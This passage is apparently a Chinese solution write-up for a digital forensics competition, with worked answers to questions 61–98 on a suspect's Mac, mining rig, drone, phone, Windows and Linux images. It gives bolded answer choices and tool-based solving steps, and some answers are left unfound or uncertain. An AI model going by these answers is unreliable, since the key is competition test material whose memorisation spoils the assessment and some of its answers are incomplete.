href="mailto:&#x45;&#x2e;&#97;&#108;&#101;&#x78;&#x31;&#x32;&#x33;&#52;&#x40;&#x61;&#112;&#x70;&#x6c;&#101;&#46;&#99;&#x6f;&#x6d;">&#x45;&#x2e;&#97;&#108;&#101;&#x78;&#x31;&#x32;&#x33;&#52;&#x40;&#x61;&#112;&#x70;&#x6c;&#101;&#46;&#99;&#x6f;&#x6d;</a></p></blockquote><p>直接在上一题的excel文件中搜索就行</p><br><hr><br><h1 id="PART6常威MAC"><a href="#PART6常威MAC" class="headerlink" title="PART6常威MAC"></a>PART6常威MAC</h1><p>这里给了一个aff4格式的镜像,取证大师读取不了,但是可以用x-ways读取:(<strong>先使用X-ways创建新案件,然后在案件下添加镜像</strong>)</p><img src="/images/meiya-2021-03/21.png" alt="image-21" style="zoom:67%;" /><p>在<code>文件</code>–<code>创建磁盘镜像</code>处,将其制作成<code>e01</code>格式的镜像:</p><p>(花了20分钟左右,一开始会显得很慢,但不用担心),直接按默认设置压缩就行</p><img src="/images/meiya-2021-03/22.png" alt="image-22" style="zoom:67%;" /><p>制作完成后就可以使用取证大师加载了:</p><img src="/images/meiya-2021-03/23.png" alt="image-23" style="zoom:67%;" /><p>在第一个分区处,右键–<code>FileVault2解密</code></p><blockquote><p>FileVault是MAC的磁盘加密机制</p><img src="/images/meiya-2021-03/24.png" alt="image-24" style="zoom:67%;" /></blockquote><img src="/images/meiya-2021-03/25.png" alt="image-25" style="zoom:67%;" /><p>解密了磁盘之后,自动取证就可以了</p><h2 id="61常威MAC的上一个系统版本及现在运行系统版本"><a href="#61常威MAC的上一个系统版本及现在运行系统版本" class="headerlink" title="61常威MAC的上一个系统版本及现在运行系统版本"></a>61常威MAC的上一个系统版本及现在运行系统版本</h2><blockquote><p>常威MAC计算机上一个系统版本是甚么及现正运行哪一个版本的系统？（3分）</p><p><strong>A. Macos 10.11.6 and Macos 11.6</strong></p><p>B. Macos 10.115 and Macos 11.5</p><p>C. Macos 10.11. 4 and macos 11.6</p><p>D.以上皆非</p></blockquote><p>当前系统版本在系统信息处直接查看</p><img src="/images/meiya-2021-03/26.png" alt="image-26" style="zoom:67%;" /><p>要查看之前的系统版本,想到系统日志里应该有<strong>系统更新日志</strong></p><p>日志中筛选以下选项中带有的<strong>10.11</strong>就找到了</p><img src="/images/meiya-2021-03/27.png" alt="image-27" style="zoom:67%;" /><br><h2 id="62常威MAC的系统事件纪录内哪个卷标（Flag）是关于储存档案于计算机"><a href="#62常威MAC的系统事件纪录内哪个卷标（Flag）是关于储存档案于计算机" class="headerlink" title="62常威MAC的系统事件纪录内哪个卷标（Flag）是关于储存档案于计算机"></a>62常威MAC的系统事件纪录内哪个卷标（Flag）是关于储存档案于计算机</h2><blockquote><p>【多选题】常威MAC计算机的系统事件纪录内哪个卷标（Flag）是关于储存档案于计算机？（3分）</p><p><strong>A. Created</strong></p><p><strong>B. InodeMetaMod</strong></p><p><strong>C. FinderInfoChanged</strong></p><p>D. IsDirectory</p><p><strong>E. Owner Changed</strong></p></blockquote><p>常识题…记住好了</p><img src="/images/meiya-2021-03/28.png" alt="image-28" style="zoom:67%;" /><br><h2 id="63常威MAC曾连接哪个无线网络"><a href="#63常威MAC曾连接哪个无线网络" class="headerlink" title="63常威MAC曾连接哪个无线网络"></a>63常威MAC曾连接哪个无线网络</h2><blockquote><p>【多选题】常威MAC计算机曾连接哪一个无线网络SSID？（2分）</p><p><strong>A. wai wifi</strong></p><p><strong>B. wanchainew1</strong></p><p>C. central2</p><p>D. Hongkong1 </p></blockquote><p>在密码钥匙串中可以找到:</p><img src="/images/meiya-2021-03/29.png" alt="image-29" style="zoom:67%;" /><p>关于苹果的AirPort:</p><img src="/images/meiya-2021-03/30.png" alt="image-30" style="zoom:67%;" /><br><h2 id="64常威MAC的使用者什么时候将“隔空投送”（airdrop）转换至任何人模式"><a href="#64常威MAC的使用者什么时候将“隔空投送”（airdrop）转换至任何人模式" class="headerlink" title="64常威MAC的使用者什么时候将“隔空投送”（airdrop）转换至任何人模式"></a>64常威MAC的使用者什么时候将“隔空投送”（airdrop）转换至任何人模式</h2><blockquote><p>【单选题】常威MAC计算机的使用者甚么时候将“隔空投送”（airdrop）转换至任何人模式？（2分）</p><p>A.2021-10-21 16:5248（UTC+8）</p><p>B.2021-10-21 18:52:48（UTC+8）</p><p>C.2021-10-21 06:52:48（UTC+8）</p><p>D.2021-10-21 08:52:48（UTC+8）</p></blockquote><p>这题没找到…</p><br><h2 id="65常威MAC计算机的APFS储存容器的文件签名和偏移值"><a href="#65常威MAC计算机的APFS储存容器的文件签名和偏移值" class="headerlink" title="65常威MAC计算机的APFS储存容器的文件签名和偏移值"></a>65常威MAC计算机的APFS储存容器的文件签名和偏移值</h2><blockquote><p>常威MAC计算机的APFS储存容器的文件签名是 <strong>NXSB</strong>偏移值为<strong>32</strong>(例如NTFS及请输入NTFS64）。（2分）</p></blockquote><p>常识题:</p><p><strong>苹果文件系统(Apple File System,APFS)</strong></p><p>其签名就在镜像文件16进制视图的起始位置,从十六进制视图也可以看出其偏移量是十六进制的20,也就是32</p><img src="/images/meiya-2021-03/31.png" alt="image-31" style="zoom:67%;" /><br><h2 id="66常威MAC的镜像档案内，总共有多少个系统默认的卷标"><a href="#66常威MAC的镜像档案内，总共有多少个系统默认的卷标" class="headerlink" title="66常威MAC的镜像档案内，总共有多少个系统默认的卷标"></a>66常威MAC的镜像档案内，总共有多少个系统默认的卷标</h2><blockquote><p>【单选题】常威MAC计算机的镜像档案内，总共有多少个系统默认的卷标？（1分）</p><p>A.4</p><p><strong>B.5</strong></p><p>C.6</p><p>D.7</p></blockquote><img src="/images/meiya-2021-03/32.png" alt="image-32" style="zoom:67%;" /><p>第一个(Chris Data)是属于用户的,剩下五个是系统默认的卷标</p><br><h2 id="67常威MAC的使用者上一次关闭浏览器时，正在浏览多少个网页"><a href="#67常威MAC的使用者上一次关闭浏览器时，正在浏览多少个网页" class="headerlink" title="67常威MAC的使用者上一次关闭浏览器时，正在浏览多少个网页"></a>67常威MAC的使用者上一次关闭浏览器时，正在浏览多少个网页</h2><p>找到最后会话记录,其中共有十条记录:</p><img src="/images/meiya-2021-03/33.png" alt="image-33" style="zoom:67%;" /><br><h2 id="68常威MAC中以下哪个档案并不是iPhone所拍摄的图片"><a href="#68常威MAC中以下哪个档案并不是iPhone所拍摄的图片" class="headerlink" title="68常威MAC中以下哪个档案并不是iPhone所拍摄的图片"></a>68常威MAC中以下哪个档案并不是iPhone所拍摄的图片</h2><blockquote><p>【多选题】常威MAC计算机中以下哪个档案并不是 Phone所拍摄的图片？（2分）</p><p>A. IMG_0002</p><p>B. IMG_0003</p><p>C. IMG_0004</p><p>D. IMG_0005</p><p>E. IMG_0006</p></blockquote><img src="/images/meiya-2021-03/34.png" alt="image-34" style="zoom:67%;" /><p>照片的Exif信息中可以看到相机型号</p><p>另外也注意到,这些照片从Alex的Iphone中也出现过,不知道Alex和常威是什么关系…</p><img src="/images/meiya-2021-03/35.png" alt="image-35" style="zoom:67%;" /><br><hr><br><h1 id="PART7常威矿机"><a href="#PART7常威矿机" class="headerlink" title="PART7常威矿机"></a>PART7常威矿机</h1><p>在网上搜了一下主流的挖矿软件:</p><img src="/images/meiya-2021-03/36.png" alt="image-36" style="zoom:67%;" /><p>那么对矿机进行分析主要需要关注挖矿软件的日志等</p><p>取证大师加载镜像之后,先在安装软件中过滤一下上述主流的挖矿软件,发现这台矿机安装了<code>Phoenix Miner</code></p><img src="/images/meiya-2021-03/37.png" alt="image-37" style="zoom:67%;" /><p>直接搜索软件名,就能够容易定位到该软件的日志文件:</p><img src="/images/meiya-2021-03/38.png" alt="image-38" style="zoom:67%;" /><p><strong>另外要注意虚拟货币交易中还有一个很重要的wallet钱包文件</strong></p><br><h2 id="69常威的矿机没有进行哪种加密货币掘矿"><a href="#69常威的矿机没有进行哪种加密货币掘矿" class="headerlink" title="69常威的矿机没有进行哪种加密货币掘矿"></a>69常威的矿机没有进行哪种加密货币掘矿</h2><blockquote><p>【多选题】在常威的矿机没有进行哪种加密货币掘矿？（2分）</p><p>A. Bitcoin</p><p>B. Ethereum</p><p>C. RVN</p><p>D. Dodge</p><p>E.ENJ</p></blockquote><p>导出挖矿软件的日志并查看: 清一色的<code>eth(以太坊)</code>没有发现其他类型的虚拟货币</p><img src="/images/meiya-2021-03/39.png" alt="image-39" style="zoom:67%;" /><br><h2 id="70在常威矿机有几张显示适配器进行掘矿"><a href="#70在常威矿机有几张显示适配器进行掘矿" class="headerlink" title="70在常威矿机有几张显示适配器进行掘矿"></a>70在常威矿机有几张显示适配器进行掘矿</h2><p>同样是在日志里找,共调用了GPU1和GPU2两张显卡</p><br><h2 id="71在常威矿机，-hiveOS操作系统是什么版本"><a href="#71在常威矿机，-hiveOS操作系统是什么版本" class="headerlink" title="71在常威矿机， hiveOS操作系统是什么版本"></a>71在常威矿机， hiveOS操作系统是什么版本</h2><p>仿真起来之后直接<code>uname -r</code>查看:</p><img src="/images/meiya-2021-03/40.png" alt="image-40" style="zoom:67%;" /><br><h2 id="72在常威矿机中哪个不是收取掘矿收益的加密货币钱包地址"><a href="#72在常威矿机中哪个不是收取掘矿收益的加密货币钱包地址" class="headerlink" title="72在常威矿机中哪个不是收取掘矿收益的加密货币钱包地址"></a>72在常威矿机中哪个不是收取掘矿收益的加密货币钱包地址</h2><blockquote><p>【多选题】在常威矿机中，哪个不是收取掘矿收益的加密货币钱包地址？（1分）</p><p>A.0xE365625f4##537151304ceba7C7D9dF0C7E829##</p><p><strong>B.Oxe68de863f4c3c3cc0##191b9cefdae91b3e6fbd8##</strong></p><p><strong>C.0x00000000897##4136b4a59731680a881895303##</strong></p><p><strong>D.0x7335c##2019533d9cc825e2a6e80821fd44e2718##</strong></p><p><strong>E.0x00##00008970514136b4a59731680a88895303##</strong></p></blockquote><p>在日志中搜索上述地址发现每一个都能搜到,那么就转换思路,找一下钱包wallet文件(直接全局搜索wallet)</p><img src="/images/meiya-2021-03/41.png" alt="image-41" style="zoom:67%;" /><br><h2 id="73常威矿机用于挖矿的登录密码"><a href="#73常威矿机用于挖矿的登录密码" class="headerlink" title="73常威矿机用于挖矿的登录密码"></a>73常威矿机用于挖矿的登录密码</h2><blockquote><p>【单选题】在常威矿机中，用于掘矿登入密码是什么？（2分）</p><p>A. eg97em##wm</p><p>B. Deg97em##wm</p><p>C. fea97em##wm</p><p>D. eeg97em##wm</p><p>E. heg97em##wm</p></blockquote><p>上述选项有共同的关键词,搜索一下就能够找到了</p><img src="/images/meiya-2021-03/42.png" alt="image-42" style="zoom:67%;" /><br><h2 id="74常威矿机中用于挖矿的Nvidia显卡驱动程序版本"><a href="#74常威矿机中用于挖矿的Nvidia显卡驱动程序版本" class="headerlink" title="74常威矿机中用于挖矿的Nvidia显卡驱动程序版本"></a>74常威矿机中用于挖矿的Nvidia显卡驱动程序版本</h2><p>挖矿软件的日志里能够找到:</p><img src="/images/meiya-2021-03/43.png" alt="image-43" style="zoom:67%;" /><br><h2 id="75用于挖矿的显卡型号"><a href="#75用于挖矿的显卡型号" class="headerlink" title="75用于挖矿的显卡型号"></a>75用于挖矿的显卡型号</h2><blockquote><p>【多选题】在常威矿机中，用于掘矿显示适配器型号包括什么？（2分）</p><p><strong>A. GeForce RTX 3060</strong></p><p><strong>B. Quadro P2000</strong></p><p>C. RX 6600</p><p>D. Ge Force GTX 1660 Ti</p><p>E. Ge Force GTX 3070</p></blockquote><p>日志里找到</p><img src="/images/meiya-2021-03/44.png" alt="image-44" style="zoom:67%;" /><h2 id="76常威的矿机哪天没有挖矿"><a href="#76常威的矿机哪天没有挖矿" class="headerlink" title="76常威的矿机哪天没有挖矿"></a>76常威的矿机哪天没有挖矿</h2><blockquote><p>【多选题】在常威矿机，哪天没有进行掘矿？（2分）</p><p>A.2021-10-06</p><p><strong>B.2021-10-09</strong></p><p><strong>C.2021-10-15</strong></p><p><strong>D.2021-10-17</strong></p><p><strong>E.2021-10-18</strong></p></blockquote><p>日志里所有记录都是10月6号的:</p><img src="/images/meiya-2021-03/45.png" alt="image-45" style="zoom:67%;" /><br><hr><br><h1 id="PART8常威无人机-手机"><a href="#PART8常威无人机-手机" class="headerlink" title="PART8常威无人机+手机"></a>PART8常威无人机+手机</h1><h2 id="77常威无人机中的哪个飞航记录DAT文件能够找到2021-10-11-1505时的GPS地点"><a href="#77常威无人机中的哪个飞航记录DAT文件能够找到2021-10-11-1505时的GPS地点" class="headerlink" title="77常威无人机中的哪个飞航记录DAT文件能够找到2021.10.11.1505时的GPS地点"></a>77常威无人机中的哪个飞航记录DAT文件能够找到2021.10.11.1505时的GPS地点</h2><blockquote><p>【填空题】常威的无人机中的飞航纪录  DAT可见到于2021年10月11日1505时的GPS地点。（请以英文全大写及阿拉伯数字回答）（1分）</p></blockquote><p>这里给的无人机镜像是和手机类似的镜像文件,可以使用<code>Cellebrite Reader</code>打开</p><p>打开之后发现一个存储飞行记录<code>dat</code>文件的目录,将此目录导出</p><img src="/images/meiya-2021-03/46.png" alt="image-46" style="zoom:67%;" /><p>文件太多,不方便挨个看,所以先定位具体时间段,由此找到对应的源文件:也就是<code>FLY096.DAT</code></p><img src="/images/meiya-2021-03/47.png" alt="image-47" style="zoom:67%;" /><br><h2 id="78无人机于2021-10-11-15-07-51时所在的地点"><a href="#78无人机于2021-10-11-15-07-51时所在的地点" class="headerlink" title="78无人机于2021.10.11.15:07:51时所在的地点"></a>78无人机于2021.10.11.15:07:51时所在的地点</h2><blockquote><p>常威的无人机于2021年10月11日15:07:51时之间所在的地点是什么？（1分）</p><p>A.22.269299.114.200486</p><p>B.22.269353,114.287267</p><p>C.22.346855.114.289552</p><p><strong>D.22.269293,114.201278</strong></p></blockquote><p>使用物联网取证分析软件解析上一题找到的<code>FLY096.DAT</code></p><img src="/images/meiya-2021-03/48.png" alt="image-48" style="zoom:67%;" /><p>选择一个最接近的选项</p><br><h2 id="79常威的无人机哪一个档案有最后降落时间"><a href="#79常威的无人机哪一个档案有最后降落时间" class="headerlink" title="79常威的无人机哪一个档案有最后降落时间"></a>79常威的无人机哪一个档案有最后降落时间</h2><p>找到最后出现的时间点,看对应的源文件,还是<code>FLY096.DAT</code></p><img src="/images/meiya-2021-03/49.png" alt="image-49" style="zoom:67%;" /><br><h2 id="80常威的手机中哪个是由无人机于2021-10-11拍摄的图像"><a href="#80常威的手机中哪个是由无人机于2021-10-11拍摄的图像" class="headerlink" title="80常威的手机中哪个是由无人机于2021.10.11拍摄的图像"></a>80常威的手机中哪个是由无人机于2021.10.11拍摄的图像</h2><blockquote><p>【多选题】常威的手机中哪一个是由常威的无人机于2021年10月11日所拍摄的图像文件？（2分）</p><p><strong>A. Containers货柜</strong></p><p><strong>B. Buildings大厦</strong></p><p>C. bicycle单车</p><p><strong>D. Mountain山</strong></p></blockquote><p>已知无人机的品牌是大疆(DJI),所以在手机的图片库里先以此为关键词过滤,找到疑似是无人机拍摄的图片:</p><img src="/images/meiya-2021-03/50.png" alt="image-50" style="zoom:67%;" /><p>到其路径下,找到10月11日无人机拍摄的所有照片</p><img src="/images/meiya-2021-03/51.png" alt="image-51" style="zoom:67%;" /><p>其中包含大厦,货柜和山,没有发现单车</p><br><h2 id="81常威的手机中显示的无人机DJGO4的版本"><a href="#81常威的手机中显示的无人机DJGO4的版本" class="headerlink" title="81常威的手机中显示的无人机DJGO4的版本"></a>81常威的手机中显示的无人机DJGO4的版本</h2><p>在安装程序列表里找到大疆的手机APP:</p><img src="/images/meiya-2021-03/52.png" alt="image-52" style="zoom:67%;" /><br><h2 id="82常威的手机中安装的DJIGO4软件中，哪个database没有显示临时禁飞区"><a href="#82常威的手机中安装的DJIGO4软件中，哪个database没有显示临时禁飞区" class="headerlink" title="82常威的手机中安装的DJIGO4软件中，哪个database没有显示临时禁飞区"></a>82常威的手机中安装的DJIGO4软件中，哪个database没有显示临时禁飞区</h2><blockquote><p>【多选题】常威的手机中所安装的DJIGO4软件中，以下哪个 database没有显示临时禁飞区？（2分）</p><p><strong>A. Filesflysate app db</strong></p><p><strong>B. Special warning.db</strong></p><p>C. Flysate app dynamic areas. db</p><p><strong>D. Flysafe polygon 1860. db</strong></p></blockquote><p>在数据库列表中过滤并查看这几个数据库文件:</p><img src="/images/meiya-2021-03/53.png" alt="image-53" style="zoom:67%;" /><p>只在C选项的数据库文件中发现了临时禁飞区</p><br><h2 id="83在哪个数据库文件可以知道DJGO4的登入电子邮件"><a href="#83在哪个数据库文件可以知道DJGO4的登入电子邮件" class="headerlink" title="83在哪个数据库文件可以知道DJGO4的登入电子邮件"></a>83在哪个数据库文件可以知道DJGO4的登入电子邮件</h2><p><strong>安卓中, <code>com.android.vending</code>是<code>google play</code>商店的应用包</strong></p><p><strong>其中的数据库包含了其他应用的一定信息</strong></p><p><strong>例如<code>localappstate</code>这个数据库记录了本地app的一些状态信息(例如APP的登录账户)</strong></p><img src="/images/meiya-2021-03/54.png" alt="image-54" style="zoom:67%;" /><img src="/images/meiya-2021-03/55.png" alt="image-55" style="zoom:67%;" /><br><h2 id="84哪个数据库文件包含了名为server-timestamp的资料"><a href="#84哪个数据库文件包含了名为server-timestamp的资料" class="headerlink" title="84哪个数据库文件包含了名为server_timestamp的资料"></a>84哪个数据库文件包含了名为server_timestamp的资料</h2><p>这个在大疆APP的数据库里就能找到:</p><img src="/images/meiya-2021-03/56.png" alt="image-56" style="zoom:67%;" /><br><hr><br><h1 id="PART9常威Windows"><a href="#PART9常威Windows" class="headerlink" title="PART9常威Windows"></a>PART9常威Windows</h1><p>看一遍题目,这部分肯定是得仿真起来了</p><img src="/images/meiya-2021-03/57.png" alt="image-57" style="zoom:67%;" /><p>虚拟机跑起来后,准备安装<code>VMware tools</code>时,偶然发现了两个可疑的文件<code>pw.txt</code>和<code>test2.txt</code></p><h2 id="85常威利用Windows计算机中的VMKali进行攻击和收取受害人电话的数据，找出常威的VM存放地址"><a href="#85常威利用Windows计算机中的VMKali进行攻击和收取受害人电话的数据，找出常威的VM存放地址" class="headerlink" title="85常威利用Windows计算机中的VMKali进行攻击和收取受害人电话的数据，找出常威的VM存放地址"></a>85常威利用Windows计算机中的VMKali进行攻击和收取受害人电话的数据，找出常威的VM存放地址</h2><blockquote><p>【单选题】常威利用 Windows计算机中的VMKali进行攻击和收取受害人电话的数据，请找出常威的VM存放地址（2分）</p><p><strong>A.Users\Chris Paul\Desktop\安全防护\MalwarekKali-Linux2020.2a-amd64_2.vmwarevm</strong></p><p>B USers\Chris paul\Desktop\安全防护\Malware demo\kali-Linux2020.2a-amd64_2.vmwarevm</p><p>C USers\Chris paul\documenys\安全防护Malware\Kali-Lnux2020.2a-amd64_2.vmwarevm</p><p>D Users\Chris Paul\Documents\Virtual machines</p></blockquote><p>仿真起来之后,桌面上有两个文件夹都放了虚拟机</p><img src="/images/meiya-2021-03/58.png" alt="image-58" style="zoom:67%;" /><p>直接打开VMware就能看到哪个是常用的了</p><img src="/images/meiya-2021-03/59.png" alt="image-59" style="zoom:67%;" /><br><h2 id="86哪个档案可以证明常威将存储数据的text2-txt移动到了kali虚拟机中"><a href="#86哪个档案可以证明常威将存储数据的text2-txt移动到了kali虚拟机中" class="headerlink" title="86哪个档案可以证明常威将存储数据的text2.txt移动到了kali虚拟机中"></a>86哪个档案可以证明常威将存储数据的text2.txt移动到了kali虚拟机中</h2><blockquote><p>【单选题】常威在收集数据后储存数据于 Windows计算机一个名为”text2.txt”的档案中，随后他将档案移往” \home\kali\ Desktop\project&quot;中，下述哪个档案可以证明这一点？i)\root. bash_history ii)\home\kali.bash_history（3分）</p><p>A.只有i</p><p>B.只有ii</p><p>C.两个也可以</p><p><strong>D.两个也不可以</strong></p></blockquote><p>在取证大师里把虚拟机文件夹导出来,然后在作为镜像添加(或者直接在vmdk文件上右键-虚拟磁盘分析)</p><p>自动取证之后在历史命令里过滤<code>test2.txt</code>这个文件:</p><img src="/images/meiya-2021-03/60.png" alt="image-60" style="zoom:67%;" /><img src="/images/meiya-2021-03/61.png" alt="image-61" style="zoom:67%;" /><p>root用户的历史命令里,能找到一个<code>mv</code>命令,但是这也只是<strong>在虚拟机内移动了这个文件</strong></p><p>不能说明将文件从主机传到了虚拟机</p><p>事实上:<strong>把文件直接从Windows里面拖进虚拟机不会留下历史命令,所以其实两者都无法证明</strong></p><br><h2 id="87常威计算机中哪一个程式-x2F-档案有可能用作收取受害人电话上的数据"><a href="#87常威计算机中哪一个程式-x2F-档案有可能用作收取受害人电话上的数据" class="headerlink" title="87常威计算机中哪一个程式&#x2F;档案有可能用作收取受害人电话上的数据"></a>87常威计算机中哪一个程式&#x2F;档案有可能用作收取受害人电话上的数据</h2><blockquote><p>【单选题】常威 Windows计算机中哪一个程式&#x2F;档案有可能用作收取受害人电话上的数据？（3分）（这题取证大师分析之后可直接排除AD，因为实在baddish文件夹下的，然后看解析出来的终端命令，就选择C了）</p><p>A. \home\kali\Desktop\server_express_ok.js</p><p>B.\home\kali\Desktop\ baddish\package.json</p><p><strong>C \home\kali\Desktop\baddish\server.js</strong></p><p>D.\home\kali\Desktop\server.js</p></blockquote><p>在上一题浏览历史命令时,已经注意到有一个名为<code>server.js</code>的脚本</p><img src="/images/meiya-2021-03/62.png" alt="image-62" style="zoom:67%;" /><p>这里使用<code>node</code>命令运行了<code>server.js</code>脚本,并将结果输入到了<code>text2.txt</code>中</p><img src="/images/meiya-2021-03/63.png" alt="image-63" style="zoom:67%;" /><p>顺着选项里的路径找到<code>server.js</code>的位置</p><img src="/images/meiya-2021-03/64.png" alt="image-64" style="zoom:67%;" /><p>最后查看一下<code>text2.txt</code>的内容,就可以确定了:</p><img src="/images/meiya-2021-03/65.png" alt="image-65" style="zoom:67%;" /><br><h2 id="88常威第一次是在哪一个日子及时间登入Kali系统"><a href="#88常威第一次是在哪一个日子及时间登入Kali系统" class="headerlink" title="88常威第一次是在哪一个日子及时间登入Kali系统"></a>88常威第一次是在哪一个日子及时间登入Kali系统</h2><blockquote><p>【多选题】常威 Windows计算机中显示常威第一次偷取受害人电话数据有机会是在哪一个日子及时间登入Kali系统？（2分）</p><p><strong>A.2021-09-27</strong></p><p>B.2021-09-29</p><p>C.2021-09-29</p><p>D.11:42:47</p><p>E.16:04:24</p><p><strong>F.16:30:04</strong></p></blockquote><p>直接找kali的登录日志,找到最早的登录时间</p><img src="/images/meiya-2021-03/66.png" alt="image-66" style="zoom:67%;" /><br><h2 id="89Windows中哪一个档案的哈希值能证明常威曾开启存有客户数据的档案"><a href="#89Windows中哪一个档案的哈希值能证明常威曾开启存有客户数据的档案" class="headerlink" title="89Windows中哪一个档案的哈希值能证明常威曾开启存有客户数据的档案"></a>89Windows中哪一个档案的哈希值能证明常威曾开启存有客户数据的档案</h2><blockquote><p>89【多选题】常威 Windows计算机中以下哪—个檔案的哈希值（MD5）能证明常威曾开启存有客户数据的档案？（2分）</p><p>A OED1DB00F8598AD3C6B331BF0C477AD4</p><p>B.1E1BDB083F66251A63B79DEA3801E6E9</p><p><strong>C.575326396E31040FE2E13BE42c553E2</strong></p><p>D.3128604B4A9Ec1D37418942555F6B08A </p><p>E. FB5EF33EDEA8ECB5BF07C5DF5332D29F</p></blockquote><p>从最近访问文件中跳转源文件,最近打开的文档,在<code>recent</code>文件中会留下<code>ink</code>的快捷方式.计算哈希比对即可</p><img src="/images/meiya-2021-03/67.png" alt="image-67" style="zoom:67%;" /><br><h2 id="90哪个档案可以找到USB装置初次连接的时间"><a href="#90哪个档案可以找到USB装置初次连接的时间" class="headerlink" title="90哪个档案可以找到USB装置初次连接的时间"></a>90哪个档案可以找到USB装置初次连接的时间</h2><blockquote><p>【单选题】常威 Windows计算机中，哪个档案可以找到USB装置初次连接的时间？（1分）</p><p>A. C:\Windows\setupapi.log</p><p>B. C:\Windows\setupapi.setup.log</p><p><strong>C. C:\WIndows\INF\setupapi.setup.log</strong></p><p>D. C:WIndows\INF\setupapi.Dev.log</p></blockquote><p>直接以四个选项都有的<code>setupapi</code>作为关键词实时搜索,然后结果中再过滤出<code>log</code>格式的文件</p><img src="/images/meiya-2021-03/68.png" alt="image-68" style="zoom:67%;" /><p>两个文件都导出来,内容差不多…但是C选项的这个时间更早…</p><img src="/images/meiya-2021-03/69.png" alt="image-69" style="zoom:67%;" /><img src="/images/meiya-2021-03/70.png" alt="image-70" style="zoom:67%;" /><br><h2 id="91此计算机连接过一个3D打印机-哪一个哈希值是属于上述打印机的驱动程序文件中的安装信息文件-INF格式"><a href="#91此计算机连接过一个3D打印机-哪一个哈希值是属于上述打印机的驱动程序文件中的安装信息文件-INF格式" class="headerlink" title="91此计算机连接过一个3D打印机,哪一个哈希值是属于上述打印机的驱动程序文件中的安装信息文件(INF格式)"></a>91此计算机连接过一个3D打印机,哪一个哈希值是属于上述打印机的驱动程序文件中的安装信息文件(INF格式)</h2><blockquote><p>【单选题】常威 Windows计算机接驳了一个3D打印机，以下哪一个哈希值是属于上述打印机的驱动程式文件中的安装信息文件（INF檔）？（提示：关键词包含CH341）（3分）</p><p>A.1348FA38956##1770D7C3E63545BC</p><p>B.DBC4F08F835###FF95420B352B506A</p><p><strong>C.35E7c67A652###611EDE19C37241c5</strong></p><p>D. BAE3BE76CC1####31EB562ABAFE28DE</p></blockquote><p>既然提示了,就直接实时搜索<code>ch341</code>,然后结果里过滤出<code>inf</code>格式的文件</p><img src="/images/meiya-2021-03/71.png" alt="image-71" style="zoom:67%;" /><br><h2 id="92接上题-上述安装信息文件的版本日期是什么"><a href="#92接上题-上述安装信息文件的版本日期是什么" class="headerlink" title="92接上题,上述安装信息文件的版本日期是什么"></a>92接上题,上述安装信息文件的版本日期是什么</h2><p>导出上一题的文件查看即可</p><img src="/images/meiya-2021-03/72.png" alt="image-72" style="zoom:67%;" /><br><h2 id="93此计算机安装了一些与3D-打印机有关的软件-有可能是以下哪个"><a href="#93此计算机安装了一些与3D-打印机有关的软件-有可能是以下哪个" class="headerlink" title="93此计算机安装了一些与3D 打印机有关的软件,有可能是以下哪个"></a>93此计算机安装了一些与3D 打印机有关的软件,有可能是以下哪个</h2><blockquote><p>93.常威Windows计算机安装了一些与3D 打印机有关的软件，有可能是以下哪个?</p><p><strong>A Ultimaker cura</strong></p><p>B 3DPrinterOS</p><p>C Simplify 3D</p><p><strong>D Creality Slicer</strong></p></blockquote><p>直接在安装的软件中过滤,只能找到AD:</p><img src="/images/meiya-2021-03/73.png" alt="image-73" style="zoom:67%;" /><br><h2 id="94续上题-哪一个档案记录了切片软件CrealitySlicer曾经开启的3d立体模块-stl-纪录"><a href="#94续上题-哪一个档案记录了切片软件CrealitySlicer曾经开启的3d立体模块-stl-纪录" class="headerlink" title="94续上题,哪一个档案记录了切片软件CrealitySlicer曾经开启的3d立体模块(.stl)纪录"></a>94续上题,哪一个档案记录了切片软件CrealitySlicer曾经开启的3d立体模块(.stl)纪录</h2><blockquote><p>【单选题】续上题，哪一个档案记录了切片软件 Creality Slicer曾经开启的3d立体模块（.stl）纪录？（1分）</p><p>A.\Users\Chris Paul\AppData\Roaming\CrealitySlicer\stderr.log</p><p>B.\Users\Chris Paul\AppData\Roaming\Creality Slicer\stdout. log</p><p>C.\Users\ Chris Paul\AppData \Roaming \CrealitySlicer\4.8\Creality Slicer .cfg</p><p><strong>D.\Users\Chris Paul\AppData\Roaming\Reality Slicer\4.8</strong></p></blockquote><p>顺着选项的路径在虚拟机里找就行,答案是D</p><img src="/images/meiya-2021-03/74.png" alt="image-74" style="zoom:67%;" /><br><h2 id="95续上题-哪个3d立体模块-stl-曾用切片软件Creality-Slicer开启"><a href="#95续上题-哪个3d立体模块-stl-曾用切片软件Creality-Slicer开启" class="headerlink" title="95续上题,哪个3d立体模块(.stl)曾用切片软件Creality Slicer开启"></a>95续上题,哪个3d立体模块(.stl)曾用切片软件Creality Slicer开启</h2><blockquote><p>【多选题】续上题，哪个3d立体模块（.stl）曾用切片软件 Creality Slicer开启？（2分）</p><p><strong>A Clip_sideb.stl</strong></p><p><strong>B frame.stl</strong></p><p>C trigger.stl</p><p>D Hand_guard.stl</p></blockquote><p>直接在上一题找到的日志文件中搜索:</p><img src="/images/meiya-2021-03/75.png" alt="image-75" style="zoom:67%;" /><br><hr><br><h1 id="PART10常威Linux"><a href="#PART10常威Linux" class="headerlink" title="PART10常威Linux"></a>PART10常威Linux</h1><p>(比赛时都没做到这里,先把网上的wp放一部分在这里,回头再补做一下)</p><h2 id="96此镜像LinuxLVM磁盘分区的长度"><a href="#96此镜像LinuxLVM磁盘分区的长度" class="headerlink" title="96此镜像LinuxLVM磁盘分区的长度"></a>96此镜像LinuxLVM磁盘分区的长度</h2><p>加载镜像后,发现分区2是逻辑分区(<strong>LVM:Logical Volume Manager</strong>),swap\root\home 是逻辑分区下的三个子分区</p><img src="/images/meiya-2021-03/76.png" alt="image-76" style="zoom:67%;" /><p>可以直接使用取证大师小程序「证据文件硬盘信息」来查看LVM分区长度</p><img src="/images/meiya-2021-03/77.png" alt="image-77" style="zoom:67%;" /><br><h2 id="97LVM分区的卷组-VolumeGroup-的通用唯一标识符"><a href="#97LVM分区的卷组-VolumeGroup-的通用唯一标识符" class="headerlink" title="97LVM分区的卷组(VolumeGroup)的通用唯一标识符"></a>97LVM分区的卷组(VolumeGroup)的通用唯一标识符</h2><img src="/images/meiya-2021-03/78.png" alt="image-78" style="zoom:67%;" /><br><h2 id="98续上题-哪一个是逻辑卷-LogicalVolume-设定的名字"><a href="#98续上题-哪一个是逻辑卷-LogicalVolume-设定的名字" class="headerlink" title="98续上题,哪一个是逻辑卷(LogicalVolume)设定的名字"></a>98续上题,哪一个是逻辑卷(LogicalVolume)设定的名字</h2><blockquote><p>【多选题】续上题，哪一个是逻辑卷（ 